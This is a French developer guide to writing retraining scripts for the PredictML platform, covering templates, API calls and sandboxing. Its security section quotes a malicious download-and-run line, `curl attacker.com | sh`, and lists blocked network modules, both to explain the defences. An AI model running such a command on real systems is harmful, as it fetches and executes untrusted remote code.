# Guide — Écrire un script train.py compatible PredictML

Ce guide explique comment écrire un script `train.py` compatible avec le système de ré-entraînement automatique de PredictML.

---

## Pourquoi un train.py ?

Si vous fournissez un `train.py` lors de l'upload d'un modèle, vous pouvez ensuite :
- Déclencher un ré-entraînement manuel depuis l'API ou le dashboard
- Planifier un ré-entraînement automatique via une expression cron
- Déclencher un ré-entraînement réactif quand le drift dépasse un seuil

---

## Contrat obligatoire

Votre script **doit** :

1. **Lire trois variables d'environnement** (injectées automatiquement par l'API) :
   - `TRAIN_START_DATE` — date de début au format `YYYY-MM-DD`
   - `TRAIN_END_DATE` — date de fin au format `YYYY-MM-DD`
   - `OUTPUT_MODEL_PATH` — chemin absolu où sauvegarder le `.pkl`

2. **Sauvegarder le modèle** à `OUTPUT_MODEL_PATH` via `pickle.dump()`

3. **Afficher un JSON sur stdout** (dernière ligne JSON) avec au minimum :
   ```json
   {"accuracy": 0.95, "f1_score": 0.94}
   ```

4. **Quitter avec code 0** si succès, code non-nul si échec

---

## Variables d'environnement disponibles

| Variable | Obligatoire | Description |
|---|---|---|
| `TRAIN_START_DATE` | Oui | Date de début de la fenêtre d'entraînement (YYYY-MM-DD) |
| `TRAIN_END_DATE` | Oui | Date de fin de la fenêtre d'entraînement (YYYY-MM-DD) |
| `OUTPUT_MODEL_PATH` | Oui | Chemin absolu du fichier `.pkl` à produire |
| `MLFLOW_TRACKING_URI` | Non | URI du serveur MLflow (ex: `http://mlflow:5000`) |
| `MODEL_NAME` | Non | Nom du modèle source |

---

## Sortie JSON attendue (stdout)

La **dernière ligne JSON** de stdout est parsée par l'API pour mettre à jour la DB et le run MLflow.

### Champs obligatoires
```json
{"accuracy": 0.95, "f1_score": 0.94}
```

### Champs optionnels (enrichissent MLflow + requirements.txt)
```json
{
    "accuracy": 0.95,
    "f1_score": 0.94,
    "n_rows": 12450,
    "feature_stats": {
        "sepal_length": {"mean": 5.8, "std": 0.83, "min": 4.3, "max": 7.9, "null_rate": 0.0}
    },
    "label_distribution": {
        "setosa": 0.33, "versicolor": 0.34, "virginica": 0.33
    },
    "dependencies": {
        "scikit-learn": "1.6.1",
        "numpy": "2.2.5",
        "pandas": "2.3.3"
    }
}
```

> **`dependencies`** : utilisé par l'API pour générer le `requirements.txt` stocké dans MinIO
> et loggué comme artefact MLflow. Si absent, l'API analyse statiquement les imports du script.

> **Important** : Ne mettez rien après ce `print()`. La progression doit aller sur `stderr`.

---

## Template minimal

```python
"""train.py — Template minimal compatible PredictML"""
import json
import os
import pickle
import sys

from sklearn.ensemble import RandomForestClassifier
from sklearn.metrics import accuracy_score, f1_score
from sklearn.model_selection import train_test_split

# ── Variables d'environnement (OBLIGATOIRES) ──────────────────────────────────
TRAIN_START_DATE = os.environ["TRAIN_START_DATE"]
TRAIN_END_DATE   = os.environ["TRAIN_END_DATE"]
OUTPUT_MODEL_PATH = os.environ["OUTPUT_MODEL_PATH"]

print(f"[train.py] Entraînement du {TRAIN_START_DATE} au {TRAIN_END_DATE}", file=sys.stderr)

# ── Chargement des données ────────────────────────────────────────────────────
# REMPLACEZ ce bloc par votre propre chargement (CSV, BDD, API, etc.)
# Filtrez obligatoirement sur [TRAIN_START_DATE, TRAIN_END_DATE]
import pandas as pd

df = pd.read_csv("data/training_data.csv", parse_dates=["date"])
df = df[(df["date"] >= TRAIN_START_DATE) & (df["date"] <= TRAIN_END_DATE)]

if df.empty:
    print(json.dumps({"error": "Aucune donnée pour cette plage de dates"}))
    sys.exit(1)

feature_cols = ["feature_1", "feature_2", "feature_3"]
X = df[feature_cols]
y = df["target"]

# ── Entraînement ──────────────────────────────────────────────────────────────
X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)

model = RandomForestClassifier(n_estimators=100, random_state=42)
model.fit(X_train, y_train)

# ── Évaluation ────────────────────────────────────────────────────────────────
y_pred = model.predict(X_test)
acc = float(accuracy_score(y_test, y_pred))
f1  = float(f1_score(y_test, y_pred, average="weighted", zero_division=0))
print(f"[train.py] Accuracy={acc:.4f}, F1={f1:.4f}", file=sys.stderr)

# ── Sauvegarde (OBLIGATOIRE) ──────────────────────────────────────────────────
with open(OUTPUT_MODEL_PATH, "wb") as f:
    pickle.dump(model, f)
print(f"[train.py] Modèle sauvegardé : {OUTPUT_MODEL_PATH}", file=sys.stderr)

# ── JSON stdout (DERNIÈRE LIGNE — lue par l'API) ──────────────────────────────
print(json.dumps({"accuracy": round(acc, 4), "f1_score": round(f1, 4)}))
```

---

## Template avec MLflow et feature stats

```python
"""train.py — Template avec MLflow + feature_stats pour drift detection"""
import json
import os
import pickle
import sys

import numpy as np
import pandas as pd
from sklearn.ensemble import GradientBoostingClassifier
from sklearn.metrics import accuracy_score, f1_score
from sklearn.model_selection import train_test_split
from sklearn.preprocessing import LabelEncoder

# ── Variables d'environnement ─────────────────────────────────────────────────
TRAIN_START_DATE    = os.environ["TRAIN_START_DATE"]
TRAIN_END_DATE      = os.environ["TRAIN_END_DATE"]
OUTPUT_MODEL_PATH   = os.environ["OUTPUT_MODEL_PATH"]
MODEL_NAME          = os.environ.get("MODEL_NAME", "my_model")
MLFLOW_TRACKING_URI = os.environ.get("MLFLOW_TRACKING_URI", "")

print(f"[{MODEL_NAME}] Training {TRAIN_START_DATE} → {TRAIN_END_DATE}", file=sys.stderr)

# ── Données ───────────────────────────────────────────────────────────────────
df = pd.read_parquet("s3://my-bucket/data/training.parquet")  # Adaptez
df = df[(df["date"] >= TRAIN_START_DATE) & (df["date"] <= TRAIN_END_DATE)]

FEATURES = ["age", "income", "score", "tenure_days"]
TARGET   = "churned"

if len(df) < 100:
    print(json.dumps({"error": f"Seulement {len(df)} lignes — entraînement annulé"}))
    sys.exit(1)

print(f"[{MODEL_NAME}] {len(df)} lignes chargées", file=sys.stderr)

X = df[FEATURES].fillna(0)
y = df[TARGET]

# ── Entraînement ──────────────────────────────────────────────────────────────
X_train, X_test, y_train, y_test = train_test_split(
    X, y, test_size=0.2, random_state=42, stratify=y
)

model = GradientBoostingClassifier(
    n_estimators=200,
    learning_rate=0.05,
    max_depth=4,
    random_state=42,
)
model.fit(X_train, y_train)
print(f"[{MODEL_NAME}] Entraînement terminé sur {len(X_train)} exemples", file=sys.stderr)

# ── Évaluation ────────────────────────────────────────────────────────────────
y_pred = model.predict(X_test)
acc = float(accuracy_score(y_test, y_pred))
f1  = float(f1_score(y_test, y_pred, average="weighted", zero_division=0))
print(f"[{MODEL_NAME}] Accuracy={acc:.4f} | F1={f1:.4f}", file=sys.stderr)

# ── Sauvegarde ────────────────────────────────────────────────────────────────
with open(OUTPUT_MODEL_PATH, "wb") as f:
    pickle.dump(model, f)
print(f"[{MODEL_NAME}] Modèle → {OUTPUT_MODEL_PATH}", file=sys.stderr)

# ── Stats pour drift detection et MLflow ─────────────────────────────────────
feature_stats = {
    col: {
        "mean":      round(float(X_train[col].mean()), 4),
        "std":       round(float(X_train[col].std()), 4),
        "min":       round(float(X_train[col].min()), 4),
        "max":       round(float(X_train[col].max()), 4),
        "null_rate": round(float(X_train[col].isna().mean()), 4),
    }
    for col in FEATURES
}

label_counts    = y_train.value_counts()
label_total     = len(y_train)
label_distribution = {
    str(k): round(float(v) / label_total, 4)
    for k, v in label_counts.items()
}

# ── JSON stdout (DERNIÈRE LIGNE — obligatoire) ─────────────────────────────
print(json.dumps({
    "accuracy":           round(acc, 4),
    "f1_score":           round(f1, 4),
    "n_rows":             len(X_train),
    "feature_stats":      feature_stats,
    "label_distribution": label_distribution,
}))
```

---

## Template pour modèle de régression

```python
"""train.py — Régression avec scikit-learn"""
import json
import os
import pickle
import sys

import numpy as np
import pandas as pd
from sklearn.ensemble import RandomForestRegressor
from sklearn.metrics import mean_absolute_error, mean_squared_error, r2_score
from sklearn.model_selection import train_test_split

# ── Variables d'environnement ─────────────────────────────────────────────────
TRAIN_START_DATE  = os.environ["TRAIN_START_DATE"]
TRAIN_END_DATE    = os.environ["TRAIN_END_DATE"]
OUTPUT_MODEL_PATH = os.environ["OUTPUT_MODEL_PATH"]

# ── Données ───────────────────────────────────────────────────────────────────
df = pd.read_csv("data/prices.csv", parse_dates=["date"])
df = df[(df["date"] >= TRAIN_START_DATE) & (df["date"] <= TRAIN_END_DATE)]

FEATURES = ["surface_m2", "rooms", "floor", "distance_center_km"]
TARGET   = "price_eur"

X = df[FEATURES]
y = df[TARGET]

X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)

# ── Entraînement ──────────────────────────────────────────────────────────────
model = RandomForestRegressor(n_estimators=100, random_state=42)
model.fit(X_train, y_train)

# ── Évaluation ────────────────────────────────────────────────────────────────
y_pred = model.predict(X_test)
mae  = float(mean_absolute_error(y_test, y_pred))
rmse = float(np.sqrt(mean_squared_error(y_test, y_pred)))
r2   = float(r2_score(y_test, y_pred))

# Pour les modèles de régression, accuracy = R² (entre 0 et 1)
# f1_score = 1 - MAE/mean(y) (proportion d'erreur relative)
acc = max(0.0, r2)
f1  = max(0.0, 1.0 - mae / float(y_test.mean()))

print(f"[train.py] MAE={mae:.2f}, RMSE={rmse:.2f}, R²={r2:.4f}", file=sys.stderr)

# ── Sauvegarde ────────────────────────────────────────────────────────────────
with open(OUTPUT_MODEL_PATH, "wb") as f:
    pickle.dump(model, f)

# ── JSON stdout ───────────────────────────────────────────────────────────────
print(json.dumps({
    "accuracy": round(acc, 4),
    "f1_score": round(f1, 4),
    "n_rows":   len(X_train),
    "feature_stats": {
        col: {"mean": round(float(X_train[col].mean()), 4), "std": round(float(X_train[col].std()), 4)}
        for col in FEATURES
    }
}))
```

---

## Uploader le modèle avec train.py

```bash
# curl
curl -X POST http://localhost:8000/models \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@mon_modele.pkl;type=application/octet-stream" \
  -F "train_file=@train.py" \
  -F "name=mon_modele" \
  -F "version=1.0.0" \
  -F "description=Mon modèle de classification" \
  -F "accuracy=0.95" \
  -F "f1_score=0.94"
```

```python
# Python
import requests

with open("mon_modele.pkl", "rb") as pkl, open("train.py", "rb") as train:
    r = requests.post(
        "http://localhost:8000/models",
        headers={"Authorization": f"Bearer {TOKEN}"},
        files={
            "file":       ("mon_modele.pkl", pkl, "application/octet-stream"),
            "train_file": ("train.py", train, "text/plain"),
        },
        data={
            "name": "mon_modele", "version": "1.0.0",
            "accuracy": "0.95", "f1_score": "0.94",
        },
    )
```

---

## Déclencher un ré-entraînement

### Via l'API

```python
response = requests.post(
    "http://localhost:8000/models/mon_modele/1.0.0/retrain",
    headers={"Authorization": f"Bearer {ADMIN_TOKEN}"},
    json={
        "start_date":     "2025-01-01",
        "end_date":       "2025-12-31",
        "new_version":    "1.1.0",
        "set_production": False,
    }
)
data = response.json()
if data["success"]:
    print(f"Nouvelle version : {data['new_version']}")
    print(f"Accuracy : {data['accuracy']}")
    print(data["stdout"][-500:])  # derniers logs
else:
    print(f"Erreur : {data['error']}")
```

### Via le dashboard (page 8 — Retrain)
1. Sélectionnez le modèle et la version source
2. Renseignez les dates de début et fin
3. Saisissez le numéro de la nouvelle version
4. Cliquez **Lancer le ré-entraînement**
5. Les logs s'affichent en temps réel

---

## Planifier un ré-entraînement automatique

```python
# Chaque lundi à 3h UTC, fenêtre de 30 jours
requests.patch(
    "http://localhost:8000/models/mon_modele/1.0.0/schedule",
    headers={"Authorization": f"Bearer {ADMIN_TOKEN}"},
    json={
        "cron":         "0 3 * * 1",
        "lookback_days": 30,
        "auto_promote": True,
        "enabled":      True,
    }
)
```

### Exemples d'expressions cron
| Expression | Déclenchement |
|---|---|
| `0 3 * * 1` | Chaque lundi à 3h UTC |
| `0 0 1 * *` | Le 1er de chaque mois à minuit |
| `0 2 * * *` | Tous les jours à 2h UTC |
| `0 */6 * * *` | Toutes les 6 heures |

---

## Vérification de la syntaxe (validation à l'upload)

L'API vérifie automatiquement que votre `train.py` :
- A une syntaxe Python valide (`ast.parse()`)
- N'importe que des modules autorisés (voir section suivante)
- Référence `TRAIN_START_DATE`
- Référence `TRAIN_END_DATE`
- Référence `OUTPUT_MODEL_PATH`
- Contient un appel `pickle.dump`, `joblib.dump` ou `save_model`

Si la validation échoue, l'upload est rejeté avec un message d'erreur détaillé.

---

## Snapshot automatique des versions de librairies

À chaque upload d'un modèle avec `train_file` et à chaque ré-entraînement (manuel ou planifié),
l'API génère un `requirements.txt` reproductible à partir des versions **réellement utilisées**
par le script dans l'environnement d'exécution (container Docker).

### Comment ça marche

**À l'upload** : l'API lance votre `train.py` en subprocess (timeout 120 s) avec des dates par
défaut (J-30 → aujourd'hui). Le script output ses propres dépendances dans le champ `dependencies`
du JSON stdout. L'API lit ce champ et génère le `requirements.txt`.

**Au ré-entraînement** : le script tourne normalement. Si son stdout contient `"dependencies"`,
ces versions sont utilisées. Sinon, fallback sur l'analyse statique des imports + `importlib.metadata`.

> Si le script échoue à l'upload (données de prod non disponibles, timeout…), l'API se rabat
> automatiquement sur l'analyse statique. L'upload n'est jamais bloqué.

### Ce que le script doit outputter

Ajoutez le bloc suivant dans votre script (autorisé depuis la liste blanche `importlib`) :

```python
import importlib.metadata as _imeta

_deps = {}
for _pkg in ["scikit-learn", "numpy", "pandas", "mlflow"]:  # listez vos packages
    try:
        _deps[_pkg] = _imeta.version(_pkg)
    except _imeta.PackageNotFoundError:
        pass
```

Et incluez `"dependencies": _deps` dans le JSON stdout final.

Exemple — pour un script utilisant `numpy`, `pandas`, `sklearn` :

```
numpy==2.2.5
pandas==2.2.3
scikit-learn==1.6.1
```

### Où trouver le requirements.txt

| Emplacement | Chemin |
|---|---|
| **MinIO** | `{model_name}/v{version}_requirements.txt` |
| **MLflow** | Artefact `environment/requirements.txt` dans le run de ré-entraînement |
| **API** | Champ `requirements_object_key` dans la réponse de `POST /models` et `GET /models` |

### Récupérer le requirements.txt

Via la console MinIO (http://localhost:9001) : naviguez dans le bucket et ouvrez le fichier.

Via l'API MinIO (Python) :

```python
from minio import Minio

client = Minio("localhost:9000", access_key="minioadmin", secret_key="minioadmin", secure=False)
data = client.get_object("predictml-models", "mon_modele/v1.0.0_requirements.txt")
print(data.read().decode())
```

Via MLflow UI (http://localhost:5000) : ouvrez le run de ré-entraînement → onglet Artifacts →
dossier `environment/` → `requirements.txt`.

### Implémentation (pour les contributeurs)

| Élément | Fichier | Symbole |
|---|---|---|
| Extraction des imports + résolution des versions | `src/services/env_snapshot_service.py` | `generate_requirements_txt()` |
| Upload à l'upload initial | `src/api/models.py` | POST /models, après upload train.py |
| Upload au ré-entraînement manuel | `src/api/models.py` | step 8b dans endpoint retrain |
| Upload au ré-entraînement planifié | `src/tasks/retrain_scheduler.py` | step 6 dans `_do_retrain()` |
| Artifact MLflow | `src/services/mlflow_service.py` | `log_retrain_run()`, param `requirements_txt` |

---

## Sécurité & sandbox

### Pourquoi un sandbox ?

Un script `train.py` syntaxiquement valide peut contenir du code malveillant :
`os.system("curl attacker.com | sh")`, ouverture de sockets réseau, lecture de
fichiers système. Le sandbox applique deux couches de protection complémentaires.

---

### Couche 1 — Liste blanche d'imports (vérifiée à l'upload)

L'API parcourt l'AST du script et rejette tout `import X` ou `from X import ...`
dont le module de premier niveau n'est pas dans la liste suivante :

| Module | Utilisation typique |
|---|---|
| `os`, `sys`, `pathlib` | Variables d'env, chemins |
| `json`, `csv`, `io` | Sérialisation, lecture de fichiers |
| `pickle`, `joblib` | Sauvegarde du modèle |
| `pandas`, `numpy` | Manipulation des données |
| `sklearn` | Entraînement et métriques |
| `datetime`, `time` | Filtres temporels |
| `math`, `statistics` | Calculs numériques |
| `collections`, `functools`, `itertools` | Utilitaires |
| `typing`, `abc`, `enum`, `dataclasses` | Annotations de types |
| `copy`, `re`, `warnings`, `logging` | Usage courant |

**Modules bloqués** (exemples) : `subprocess`, `socket`, `requests`, `urllib`,
`http`, `ftplib`, `ctypes`, `paramiko`, `boto3`, `multiprocessing`.

```python
# ✅ Autorisé
import os
import pandas as pd
from sklearn.ensemble import RandomForestClassifier
from datetime import datetime

# ❌ Rejeté à l'upload — "Import non autorisé : 'subprocess'"
import subprocess
import requests
from socket import create_connection
import urllib.request
```

#### Ajouter un module à la liste blanche

Si votre stack ML utilise `xgboost`, `lightgbm`, `torch`, etc., ouvrez une PR
pour ajouter le module à `_ALLOWED_IMPORT_MODULES` dans `src/api/models.py`.

**Ne pas** exposer cette liste via une variable d'environnement ou `docker-compose` :
c'est un contrôle de sécurité qui doit passer par une revue de code, pas une option
de déploiement.

---

### Couche 2 — Contraintes de ressources (appliquées à l'exécution)

Le sous-processus qui exécute `train.py` est soumis aux limites suivantes via
`resource.setrlimit` (Linux, `preexec_fn` post-`fork`) :

| Limite | Valeur | Effet |
|---|---|---|
| `RLIMIT_AS` | 2 Go | Mémoire virtuelle maximale — évite un crash de l'API par OOM |
| `RLIMIT_NOFILE` | 50 | Descripteurs de fichiers ouverts simultanément — rend difficile l'ouverture de connexions réseau en masse |

Ces limites s'appliquent aux deux points d'entrée :
- `POST /models/{name}/{version}/retrain` (endpoint manuel)
- Scheduler APScheduler (retrain planifié)

---

### Environnement injecté dans le subprocess

Le script ne reçoit **pas** `os.environ` complet de l'API. Seules ces clés sont
transmises, plus les variables fonctionnelles :

| Clé | Type |
|---|---|
| `PATH`, `HOME`, `USER`, `LANG`, `LC_ALL` | Système (liste blanche fixe) |
| `TMPDIR`, `TEMP`, `TMP` | Système |
| `PYTHONPATH`, `PYTHONDONTWRITEBYTECODE`, `VIRTUAL_ENV` | Python |
| `TRAIN_START_DATE`, `TRAIN_END_DATE` | Fonctionnel (injecté par l'API) |
| `OUTPUT_MODEL_PATH`, `MLFLOW_TRACKING_URI`, `MODEL_NAME` | Fonctionnel (injecté par l'API) |

`DATABASE_URL`, `SECRET_KEY` et tous les autres secrets présents dans l'environnement
de l'API ne sont **jamais** transmis au script.

---

### Implémentation (pour les contributeurs)

| Élément | Fichier | Symbole |
|---|---|---|
| Liste blanche + validation AST | `src/api/models.py` | `_ALLOWED_IMPORT_MODULES`, `_validate_train_script()` |
| Limites ressources — endpoint | `src/api/models.py` | `_set_subprocess_limits()` |
| Limites ressources — scheduler | `src/tasks/retrain_scheduler.py` | `_set_subprocess_limits()` |
| Env minimal — endpoint | `src/api/models.py` | `_safe_env_keys` |
| Env minimal — scheduler | `src/tasks/retrain_scheduler.py` | `_SAFE_ENV_KEYS` |
| Tests | `tests/test_retrain.py` | `TestValidateTrainScript` (17 tests) |

---

## Ré-entraînement déclenché par drift

Si vous configurez `trigger_on_drift` dans le schedule, un ré-entraînement est automatiquement déclenché quand le drift atteint le seuil :

```python
requests.patch(
    "http://localhost:8000/models/mon_modele/1.0.0/schedule",
    headers={"Authorization": f"Bearer {ADMIN_TOKEN}"},
    json={
        "cron":                       "0 3 * * 1",
        "lookback_days":               30,
        "trigger_on_drift":            "critical",  # ou "warning"
        "drift_retrain_cooldown_hours": 24,          # évite les boucles
        "enabled":                    True,
    }
)
```
